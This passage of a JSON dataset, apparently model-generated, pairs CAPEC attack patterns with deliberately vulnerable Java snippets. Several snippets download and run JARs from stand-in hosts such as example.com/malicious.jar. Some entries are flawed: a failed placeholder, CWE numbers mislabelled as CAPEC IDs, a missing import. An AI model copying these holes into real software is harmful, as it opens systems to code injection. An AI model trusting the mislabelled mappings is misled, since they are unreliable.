        "code_snippet": "public class RegisterAccess {\n    private static final int LOCK_BIT = 0x1;\n    private int controlRegister = 0x0;\n    private boolean lockBitSet = false;\n\n    public void setControlRegister(int value) {\n        if (!lockBitSet) {\n            controlRegister = value;\n        } else {\n            System.out.println(\"Error: Control register is locked.\");\n        }\n    }\n\n    public void setLockBit() {\n        lockBitSet = true;\n    }\n\n    public void modifyLockBit(boolean newValue) {\n        lockBitSet = newValue; // CWE-1231: Improper Prevention of Lock Bit Modification\n    }\n\n    public int getControlRegister() {\n        return controlRegister;\n    }\n\n    public static void main(String[] args) {\n        RegisterAccess regAccess = new RegisterAccess();\n        regAccess.setControlRegister(0xFF);\n        regAccess.setLockBit();\n        regAccess.modifyLockBit(false); // Vulnerability: lock bit can be modified\n        regAccess.setControlRegister(0xAA); // Control register can be modified after lock bit is reset\n        System.out.println(\"Control Register: \" + regAccess.getControlRegister());\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable implementation of register access control. The `RegisterAccess` class contains a control register and a lock bit. The `setControlRegister` method allows setting the control register value only if the lock bit is not set. The `setLockBit` method sets the lock bit to prevent further modifications to the control register. However, the `modifyLockBit` method allows changing the lock bit value even after it has been set, which is a vulnerability (CWE-1231: Improper Prevention of Lock Bit Modification). This allows an adversary to reset the lock bit and modify the control register, exploiting the improper access control (CAPEC: Exploitation of Improperly Controlled Registers)."
    },
    {
        "capec_id": "681",
        "capec_name": "Exploitation of Improperly Controlled Hardware Security Identifiers",
        "code_snippet": "public class SoCSystem {\n    private static final int ALLOWED_TOKEN = 12345; // Hardcoded token for simplicity\n\n    public static void main(String[] args) {\n        int token = generateSecurityToken();\n        if (isValidToken(token)) {\n            performSensitiveAction();\n        } else {\n            System.out.println(\"Access Denied: Invalid Token\");\n        }\n    }\n\n    private static int generateSecurityToken() {\n        // Incorrect token generation logic\n        return 54321; // This should be dynamically generated and securely managed\n    }\n\n    private static boolean isValidToken(int token) {\n        // Improper token validation logic\n        return token == ALLOWED_TOKEN; // This should involve more complex validation\n    }\n\n    private static void performSensitiveAction() {\n        System.out.println(\"Sensitive action performed.\");\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable implementation of a security token mechanism in a System-on-Chip (SoC) environment. The code includes a hardcoded allowed token and an incorrect token generation function, which does not securely generate or manage tokens. The `isValidToken` method performs a simplistic and insecure validation of the token. This example embodies the main idea of CAPEC-Exploitation of Improperly Controlled Hardware Security Identifiers and highlights related CWEs such as Improper Restriction of Security Token Assignment (CWE-1259), Generation of Incorrect Security Tokens (CWE-1270), and Insecure Security Identifier Mechanism (CWE-1294). The code snippet shows how an adversary could exploit these weaknesses to gain unauthorized access to sensitive actions within the SoC."
    },
    {
        "capec_id": "682",
        "capec_name": "Exploitation of Firmware or ROM Code with Unpatchable Vulnerabilities",
        "code_snippet": "public class FirmwareDevice {\n    private final byte[] firmware;\n    private final boolean isUpdateable;\n\n    public FirmwareDevice(byte[] firmware, boolean isUpdateable) {\n        this.firmware = firmware;\n        this.isUpdateable = isUpdateable;\n    }\n\n    public void updateFirmware(byte[] newFirmware) throws UnsupportedOperationException {\n        if (!isUpdateable) {\n            throw new UnsupportedOperationException(\"Firmware cannot be updated.\");\n        }\n        // Simulate firmware update\n        System.arraycopy(newFirmware, 0, firmware, 0, newFirmware.length);\n    }\n\n    public static void main(String[] args) {\n        byte[] initialFirmware = new byte[1024]; // Initial firmware\n        FirmwareDevice device = new FirmwareDevice(initialFirmware, false); // Device with unpatchable firmware\n\n        try {\n            byte[] newFirmware = new byte[1024]; // New firmware\n            device.updateFirmware(newFirmware);\n        } catch (UnsupportedOperationException e) {\n            System.out.println(e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet defines a `FirmwareDevice` class that simulates a device with firmware. The class has a constructor that initializes the firmware and a boolean flag indicating whether the firmware is updateable. The `updateFirmware` method attempts to update the firmware but throws an `UnsupportedOperationException` if the firmware is not updateable. The `main` method demonstrates creating a device with unpatchable firmware and attempting to update it, which results in an exception. This code embodies the main idea of CAPEC-1277, CAPEC-1310, and CAPEC-1329 by illustrating a device that cannot be updated, thus remaining vulnerable to any existing firmware issues."
    },
    {
        "capec_id": "690",
        "capec_name": "Metadata Spoofing",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class MetadataSpoofingExample {\n    public static void main(String[] args) {\n        try {\n            // CWE-494: Download of Code Without Integrity Check\n            URL url = new URL(\"http://example.com/malicious.jar\");\n            InputStream in = url.openStream();\n            FileOutputStream fos = new FileOutputStream(\"downloaded.jar\");\n            byte[] buffer = new byte[1024];\n            int bytesRead;\n            while ((bytesRead = in.read(buffer)) != -1) {\n                fos.write(buffer, 0, bytesRead);\n            }\n            fos.close();\n            in.close();\n\n            // Load the downloaded JAR file\n            URL[] urls = {new URL(\"file:downloaded.jar\")};\n            URLClassLoader classLoader = new URLClassLoader(urls);\n            Class<?> clazz = classLoader.loadClass(\"com.example.MaliciousClass\");\n            Runnable instance = (Runnable) clazz.getDeclaredConstructor().newInstance();\n            instance.run();\n\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where metadata spoofing can occur. The code downloads a JAR file from a remote URL without performing any integrity checks (CWE-494). The downloaded file is then loaded and executed, potentially allowing a malicious actor to present a harmful resource as legitimate. This embodies the main idea of CAPEC- Metadata Spoofing, where an adversary can alter the metadata of a resource to make it appear credible. The lack of integrity checks and verification makes the system vulnerable to such attacks."
    },
    {
        "capec_id": "691",
        "capec_name": "Spoof Open-Source Software Metadata",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableDownloader {\n    public static void main(String[] args) {\n        String url = \"http://example.com/malicious-library.jar\";\n        String fileName = \"malicious-library.jar\";\n        try {\n            downloadFile(url, fileName);\n            Runtime.getRuntime().exec(\"java -jar \" + fileName);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public static void downloadFile(String url, String fileName) throws IOException {\n        try (BufferedInputStream in = new BufferedInputStream(new URL(url).openStream());\n             FileOutputStream fileOutputStream = new FileOutputStream(fileName)) {\n            byte dataBuffer[] = new byte[1024];\n            int bytesRead;\n            while ((bytesRead = in.read(dataBuffer, 0, 1024)) != -1) {\n                fileOutputStream.write(dataBuffer, 0, bytesRead);\n            }\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable software downloader that embodies the main idea of the CAPEC 'Spoof Open-Source Software Metadata'. The code downloads a JAR file from a specified URL and executes it without performing any integrity checks or verifying the source. This represents CWE-494 (Download of Code Without Integrity Check) and CWE-348 (Use of Less Trusted Source). The downloaded file could contain malicious code (CWE-506), and the lack of verification makes it easy for an attacker to spoof the metadata and trick the system into downloading and executing malicious software. This also highlights the risk of depending on potentially vulnerable third-party components (CWE-1395)."
    },
    {
        "capec_id": "692",
        "capec_name": "Spoof Version Control System Commit Metadata",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableVCS {\n    public static void main(String[] args) {\n        try {\n            // CWE-494: Download of Code Without Integrity Check\n            URL url = new URL(\"http://example.com/malicious-repo.zip\");\n            InputStream in = url.openStream();\n            FileOutputStream fos = new FileOutputStream(new File(\"repo.zip\"));\n            byte[] buffer = new byte[1024];\n            int length;\n            while ((length = in.read(buffer)) > 0) {\n                fos.write(buffer, 0, length);\n            }\n            fos.close();\n            in.close();\n\n            // Unzip the downloaded repository (simulated)\n            unzipRepo(\"repo.zip\", \"./repo\");\n\n            // CWE-527: Exposure of Version-Control Repository to an Unauthorized Control Sphere\n            File repoDir = new File(\"./repo\");\n            if (repoDir.exists()) {\n                System.out.println(\"Repository downloaded and extracted.\");\n            }\n\n            // CWE-348: Use of Less Trusted Source\n            File trustedRepo = new File(\"./trusted-repo\");\n            if (!trustedRepo.exists()) {\n                System.out.println(\"Using less trusted source for repository.\");\n            }\n\n            // Simulate spoofing commit metadata\n            File commitFile = new File(\"./repo/.git/COMMIT_EDITMSG\");\n            if (commitFile.exists()) {\n                BufferedWriter writer = new BufferedWriter(new FileWriter(commitFile, true));\n                writer.write(\"\\nSpoofed commit: Fix critical security issue\");\n                writer.close();\n                System.out.println(\"Commit metadata spoofed.\");\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static void unzipRepo(String zipFilePath, String destDir) throws IOException {\n        // Simulated unzip function\n        File dir = new File(destDir);\n        if (!dir.exists()) dir.mkdirs();\n        System.out.println(\"Unzipped repository to \" + destDir);\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where an adversary can spoof version control system (VCS) commit metadata. The code downloads a repository from a remote location without verifying its integrity (CWE-494), extracts it, and exposes it to an unauthorized control sphere (CWE-527). It also uses a less trusted source for the repository (CWE-348) and simulates the spoofing of commit metadata to deceive users into believing the repository is frequently maintained and originates from a trusted source. The code highlights the vulnerabilities associated with downloading and using unverified code, exposing repositories to unauthorized access, and using less trusted sources."
    },
    {
        "capec_id": "693",
        "capec_name": "StarJacking",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableDownloader {\n    public static void main(String[] args) {\n        String url = \"http://example.com/malicious-package.jar\";\n        String fileName = \"malicious-package.jar\";\n        try {\n            downloadFile(url, fileName);\n            executeFile(fileName);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public static void downloadFile(String url, String fileName) throws IOException {\n        try (BufferedInputStream in = new BufferedInputStream(new URL(url).openStream());\n             FileOutputStream fileOutputStream = new FileOutputStream(fileName)) {\n            byte dataBuffer[] = new byte[1024];\n            int bytesRead;\n            while ((bytesRead = in.read(dataBuffer, 0, 1024)) != -1) {\n                fileOutputStream.write(dataBuffer, 0, bytesRead);\n            }\n        }\n    }\n\n    public static void executeFile(String fileName) throws IOException {\n        Runtime.getRuntime().exec(\"java -jar \" + fileName);\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable software downloader that embodies the concept of 'StarJacking'. The code downloads a JAR file from a specified URL and executes it without performing any integrity checks or verifying the source. This represents CWE-494 (Download of Code Without Integrity Check) and CWE-348 (Use of Less Trusted Source). The downloaded file could contain malicious code (CWE-506), and the code does not ensure the authenticity of the source, making it susceptible to attacks. This scenario highlights the risk of relying on potentially spoofed popularity metadata to trust and execute software packages."
    },
    {
        "capec_id": "694",
        "capec_name": "System Location Discovery",
        "code_snippet": "import java.util.TimeZone;\nimport java.util.Locale;\nimport java.util.Properties;\n\npublic class SystemLocationDiscovery {\n    public static void main(String[] args) {\n        // CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n        TimeZone timeZone = TimeZone.getDefault();\n        Locale locale = Locale.getDefault();\n        Properties systemProperties = System.getProperties();\n\n        // Collecting sensitive system information\n        String timeZoneID = timeZone.getID();\n        String language = locale.getLanguage();\n        String country = locale.getCountry();\n        String osName = systemProperties.getProperty(\"os.name\");\n        String userHome = systemProperties.getProperty(\"user.home\");\n\n        // CWE-360: Trust of System Event Data\n        // CWE-222: Truncation of Security-relevant Information\n        // CWE-1422: Exposure of Sensitive Information caused by Incorrect Data Forwarding during Transient Execution\n        System.out.println(\"Time Zone: \" + timeZoneID);\n        System.out.println(\"Language: \" + language);\n        System.out.println(\"Country: \" + country);\n        System.out.println(\"OS Name: \" + osName);\n        System.out.println(\"User Home Directory: \" + userHome);\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of 'System Location Discovery' by collecting and printing sensitive system information such as the system's time zone, language, country, operating system name, and user home directory. The code highlights several Common Weakness Enumerations (CWEs):\n\n1. CWE-497: The code exposes sensitive system information to unauthorized control spheres by printing it to the console.\n2. CWE-360: The code trusts system event data (e.g., system properties) without validation, which can be spoofed.\n3. CWE-222: The code may truncate security-relevant information when printing it, potentially obscuring the source or nature of an attack.\n4. CWE-1422: The code could expose sensitive information due to incorrect data forwarding during transient execution.\n\nOverall, the code represents the main idea of CAPEC 'System Location Discovery' by gathering and exposing system location-related information, which could be used by an adversary to tailor further attacks."
    },
    {
        "capec_id": "695",
        "capec_name": "Repo Jacking",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class RepoJackingExample {\n    public static void main(String[] args) {\n        try {\n            // CWE-494: Download of Code Without Integrity Check\n            URL url = new URL(\"http://example.com/malicious-repo.jar\");\n            InputStream in = url.openStream();\n            Files.copy(in, Paths.get(\"malicious-repo.jar\"), StandardCopyOption.REPLACE_EXISTING);\n            in.close();\n\n            // CWE-829: Inclusion of Functionality from Untrusted Control Sphere\n            URLClassLoader classLoader = new URLClassLoader(new URL[]{new URL(\"file:malicious-repo.jar\")});\n            Class<?> clazz = classLoader.loadClass(\"com.malicious.MaliciousClass\");\n            Runnable maliciousCode = (Runnable) clazz.getDeclaredConstructor().newInstance();\n            maliciousCode.run();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where an application downloads a JAR file from an external URL without verifying its integrity (CWE-494). The downloaded JAR file is then loaded and executed, incorporating functionality from an untrusted source (CWE-829). This represents the main idea of 'Repo Jacking', where an adversary can trick users into incorporating malicious code into their applications by exploiting the redirect property of VCS repositories. The code highlights the risks of downloading and executing code from untrusted sources without proper validation."
    },
    {
        "capec_id": "696",
        "capec_name": "Load Value Injection",
        "code_snippet": "public class LoadValueInjection {\n    private static final int SECRET = 0x12345678; // Sensitive data\n    private static final int[] cache = new int[256]; // Simulated cache\n\n    public static void main(String[] args) {\n        int attackerControlledIndex = 300; // Out of bounds index\n        try {\n            // Simulate a page fault or microcode assist\n            int value = loadValue(attackerControlledIndex);\n            // Transient execution using attacker-controlled data\n            int secret = cache[value];\n            System.out.println(\"Secret: \" + secret);\n        } catch (ArrayIndexOutOfBoundsException e) {\n            // Handle the fault\n            System.out.println(\"Page fault or microcode assist occurred\");\n        }\n    }\n\n    private static int loadValue(int index) throws ArrayIndexOutOfBoundsException {\n        // Simulate loading a value that causes a page fault or microcode assist\n        if (index >= cache.length) {\n            throw new ArrayIndexOutOfBoundsException();\n        }\n        return cache[index];\n    }\n\n    static {\n        // Initialize cache with some values\n        for (int i = 0; i < cache.length; i++) {\n            cache[i] = i;\n        }\n        // Place secret in the cache\n        cache[SECRET & 0xFF] = SECRET;\n    }\n}",
        "description": "This Java code snippet simulates a Load Value Injection (LVI) attack. The main idea is to exploit a hardware design flaw in CPU transient instruction execution. The code demonstrates how an attacker can induce a page fault or microcode assist by accessing an out-of-bounds index in an array, causing the CPU to transiently forward attacker-controlled data. This data is then used in a transient execution to access sensitive information (a secret) stored in a simulated cache. The code highlights the vulnerabilities related to information exposure through microarchitectural state and incorrect data forwarding during transient execution."
    },
    {
        "capec_id": "697",
        "capec_name": "DHCP Spoofing",
        "code_snippet": "User intervention needed!",
        "description": "The model failed to generate a description for this code snippet. Error: Could not parse response content as the length limit was reached"
    },
    {
        "capec_id": "698",
        "capec_name": "Install Malicious Extension",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class MaliciousExtension {\n    public static void main(String[] args) {\n        try {\n            // CWE-494: Download of Code Without Integrity Check\n            URL url = new URL(\"http://malicious.example.com/malicious.jar\");\n            InputStream in = url.openStream();\n            FileOutputStream fos = new FileOutputStream(\"malicious.jar\");\n\n            byte[] buffer = new byte[4096];\n            int bytesRead;\n            while ((bytesRead = in.read(buffer)) != -1) {\n                fos.write(buffer, 0, bytesRead);\n            }\n            fos.close();\n            in.close();\n\n            // CWE-829: Inclusion of Functionality from Untrusted Control Sphere\n            URLClassLoader classLoader = new URLClassLoader(new URL[]{new File(\"malicious.jar\").toURI().toURL()});\n            Class<?> clazz = classLoader.loadClass(\"MaliciousClass\");\n            Runnable maliciousCode = (Runnable) clazz.getDeclaredConstructor().newInstance();\n\n            // CWE-507: Trojan Horse\n            maliciousCode.run();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of 'Install Malicious Extension' by downloading and executing a malicious JAR file. The code embodies several related CWEs:\n\n1. CWE-494: The code downloads a JAR file from a remote URL without verifying its integrity or origin.\n2. CWE-829: The downloaded JAR file is loaded and executed, which includes functionality from an untrusted source.\n3. CWE-507: The downloaded JAR file contains a class that, when executed, performs malicious actions, representing a Trojan Horse.\n\nThe main idea is to show how an adversary can trick a user into installing and running a malicious extension, leading to potential security breaches."
    },
    {
        "capec_id": "699",
        "capec_name": "Eavesdropping on a Monitor",
        "code_snippet": "import java.awt.GraphicsDevice;\nimport java.awt.GraphicsEnvironment;\nimport java.awt.Robot;\nimport java.awt.image.BufferedImage;\nimport javax.imageio.ImageIO;\nimport java.io.File;\nimport java.io.IOException;\n\npublic class ScreenCapture {\n    public static void main(String[] args) {\n        try {\n            // Get the screen device\n            GraphicsDevice screen = GraphicsEnvironment.getLocalGraphicsEnvironment().getDefaultScreenDevice();\n            Robot robot = new Robot(screen);\n\n            // Capture the screen content\n            BufferedImage screenCapture = robot.createScreenCapture(screen.getDefaultConfiguration().getBounds());\n\n            // Save the captured image to a file (cleartext storage)\n            ImageIO.write(screenCapture, \"png\", new File(\"screencapture.png\"));\n\n            System.out.println(\"Screen captured and saved.\");\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet captures the content of an external monitor and saves it as an image file. The code uses the `Robot` class to take a screenshot of the entire screen and then saves the captured image in cleartext (unprotected) format. This represents the CAPEC 'Eavesdropping on a Monitor' by demonstrating how an attacker could capture screen content without modifying any cables or installing software on the target system. The code also embodies CWE-1300 (Improper Protection of Physical Side Channels) and CWE-319 (Cleartext Transmission of Sensitive Information) by not protecting the captured data, making it vulnerable to unauthorized access."
    },
    {
        "capec_id": "700",
        "capec_name": "Network Boundary Bridging",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class NetworkBoundaryBridging {\n    public static void main(String[] args) {\n        try {\n            // Establish a connection to a trusted network\n            Socket trustedSocket = new Socket(\"trusted-network.com\", 8080);\n            DataOutputStream trustedOut = new DataOutputStream(trustedSocket.getOutputStream());\n            DataInputStream trustedIn = new DataInputStream(trustedSocket.getInputStream());\n\n            // Establish a connection to an untrusted network\n            Socket untrustedSocket = new Socket(\"untrusted-network.com\", 9090);\n            DataOutputStream untrustedOut = new DataOutputStream(untrustedSocket.getOutputStream());\n            DataInputStream untrustedIn = new DataInputStream(untrustedSocket.getInputStream());\n\n            // Improperly bridge the trusted and untrusted networks\n            String message = \"Sensitive Data\";\n            untrustedOut.writeUTF(message); // CWE-923: Improper Restriction of Communication Channel to Intended Endpoints\n            String response = untrustedIn.readUTF();\n            trustedOut.writeUTF(response); // CWE-501: Trust Boundary Violation\n\n            // Close connections\n            trustedSocket.close();\n            untrustedSocket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where an adversary bridges a trusted network and an untrusted network, violating network boundaries. The code establishes two separate socket connections: one to a trusted network and another to an untrusted network. It then improperly sends sensitive data from the trusted network to the untrusted network and vice versa. This embodies the CAPEC 'Network Boundary Bridging' by showing how an adversary can misuse network boundary devices to create a channel between trusted and untrusted networks. The code also highlights related CWEs such as CWE-923 (Improper Restriction of Communication Channel to Intended Endpoints) and CWE-501 (Trust Boundary Violation) by demonstrating improper handling of communication channels and mixing of trusted and untrusted data."
    },
    {
        "capec_id": "701",
        "capec_name": "Browser in the Middle (BiTM)",
        "code_snippet": "import java.io.*;\nimport java.net.*;\nimport javax.servlet.*;\nimport javax.servlet.http.*;\n\npublic class VulnerableRemoteDesktopServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String targetUrl = request.getParameter(\"targetUrl\");\n        if (targetUrl == null || !targetUrl.startsWith(\"http\")) {\n            response.sendError(HttpServletResponse.SC_BAD_REQUEST, \"Invalid URL\");\n            return;\n        }\n\n        URL url = new URL(targetUrl);\n        HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n        connection.setRequestMethod(\"GET\");\n\n        InputStream inputStream = connection.getInputStream();\n        OutputStream outputStream = response.getOutputStream();\n\n        byte[] buffer = new byte[1024];\n        int bytesRead;\n        while ((bytesRead = inputStream.read(buffer)) != -1) {\n            outputStream.write(buffer, 0, bytesRead);\n        }\n\n        inputStream.close();\n        outputStream.close();\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a vulnerable implementation of a remote desktop connection through a web browser. The servlet takes a 'targetUrl' parameter from the request, which is intended to be the URL of the remote desktop session. The code then opens a connection to this URL and streams the content back to the client. This implementation is vulnerable to several issues:\n\n1. **CWE-294: Authentication Bypass by Capture-replay** - The code does not implement any authentication mechanism, allowing an attacker to replay requests to the servlet.\n2. **CWE-345: Insufficient Verification of Data Authenticity** - The code does not verify the authenticity of the 'targetUrl', potentially allowing an attacker to redirect the connection to a malicious server.\n3. **CWE-602: Client-Side Enforcement of Server-Side Security** - The servlet relies on the client to provide a valid 'targetUrl', which is a security mechanism that should be enforced server-side.\n4. **CWE-830: Inclusion of Web Functionality from an Untrusted Source** - The servlet includes web functionality from an untrusted source by connecting to the 'targetUrl' without proper validation.\n\nThis code snippet embodies the main idea of the CAPEC 'Browser in the Middle (BiTM)' by demonstrating how an adversary could exploit a web browser to establish a remote desktop connection to an adversary's system, leveraging the related CWEs to highlight the vulnerabilities."
    },
    {
        "capec_id": "702",
        "capec_name": "Exploiting Incorrect Chaining or Granularity of Hardware Debug Components",
        "code_snippet": "public class DebugComponent {\n    private boolean isAuthorized;\n    private boolean debugMode;\n    private String sensitiveData;\n\n    public DebugComponent(boolean isAuthorized) {\n        this.isAuthorized = isAuthorized;\n        this.debugMode = false;\n        this.sensitiveData = \"Sensitive Trace Data\";\n    }\n\n    public void enableDebugMode() {\n        if (isAuthorized) {\n            this.debugMode = true;\n            System.out.println(\"Debug mode enabled.\");\n        } else {\n            System.out.println(\"Unauthorized access to debug mode.\");\n        }\n    }\n\n    public void accessSensitiveData() {\n        if (debugMode) {\n            System.out.println(\"Accessing: \" + sensitiveData);\n        } else {\n            System.out.println(\"Debug mode not enabled. Cannot access sensitive data.\");\n        }\n    }\n\n    public static void main(String[] args) {\n        DebugComponent debugComponent = new DebugComponent(true);\n        debugComponent.enableDebugMode();\n        debugComponent.accessSensitiveData();\n\n        DebugComponent unauthorizedComponent = new DebugComponent(false);\n        unauthorizedComponent.enableDebugMode();\n        unauthorizedComponent.accessSensitiveData();\n    }\n}",
        "description": "This Java code snippet represents a simplified model of a hardware debug component with improper access control and incorrect granularity. The `DebugComponent` class has a constructor that sets the authorization status. The `enableDebugMode` method checks if the user is authorized before enabling debug mode. The `accessSensitiveData` method allows access to sensitive data only if debug mode is enabled. The main idea is to demonstrate how improper access control and incorrect granularity can lead to unauthorized access to debug functionality and sensitive data. The code highlights the importance of checking authorization on a per-function basis and ensuring proper management of sensitive data."
    }
]